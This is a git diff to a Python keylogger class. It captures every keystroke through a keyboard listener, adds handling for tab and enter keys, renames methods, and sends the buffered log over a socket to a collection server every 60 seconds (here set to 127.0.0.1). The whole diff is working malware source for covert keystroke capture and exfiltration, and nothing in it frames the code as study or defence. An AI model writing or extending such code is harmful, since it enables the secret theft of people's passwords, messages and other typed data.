@@ -24,17 +24,21 @@ class Keylogger:
         self.log = self.log + string
 
     # process the pressed key
-    def _process_key_press(self, key):
+    def _process_pressed_key(self, key):
         try:
             current_key = str(key.char)
         except AttributeError:
             if key == key.space:
                 current_key = " "
+            elif key == key.tab:
+                current_key = "\t"
+            elif key == key.enter:
+                current_key = "\n"
             else:
-                current_key = " " + str(key) + " "
+                current_key = "<" + str(key) + ">"
         self._append_to_log(current_key)
 
-    def _send_server(self):
+    def _send_2_server(self):
         if self.log != "":
             message = self.log.encode('utf-8')
             message_header = f"{len(message):<{self.header_lenght}}".encode('utf-8')
@@ -48,7 +52,6 @@ class Keylogger:
 
                 username_length = int(username_header.decode('utf-8').strip())
                 username = self.client_socket.recv(username_length).decode('utf-8')
-
                 message_header = self.client_socket.recv(self.header_lenght)
                 message_length = int(message_header.decode('utf-8').strip())
                 message = self.client_socket.recv(message_length).decode('utf-8')
@@ -63,22 +66,22 @@ class Keylogger:
 
     # function to print the user input in the given interval
     def _report(self):
-        self._send_server()
+        self._send_2_server()
         self.log = ""
         timer = Timer(self.interval, self._report)
         timer.start()
 
     def start(self):
-        # listening the user input
-        keyboard_listener = keyboard.Listener(on_press=self._process_key_press)
+        # listening 2 the user input
+        keyboard_listener = keyboard.Listener(on_press=self._process_pressed_key)
         with keyboard_listener:
-            # starts printing keys on the screen
+            # starts sending keys to server
             self._report()
             # waiting the listener to finish
             keyboard_listener.join()
 
 
 # adding a print interval of 10 seconds
-keylogger = Keylogger(10, "127.0.0.1", 11234, 10)
+keylogger = Keylogger(60, "127.0.0.1", 11234, 10)
 # starting the keyloggger
 keylogger.start()
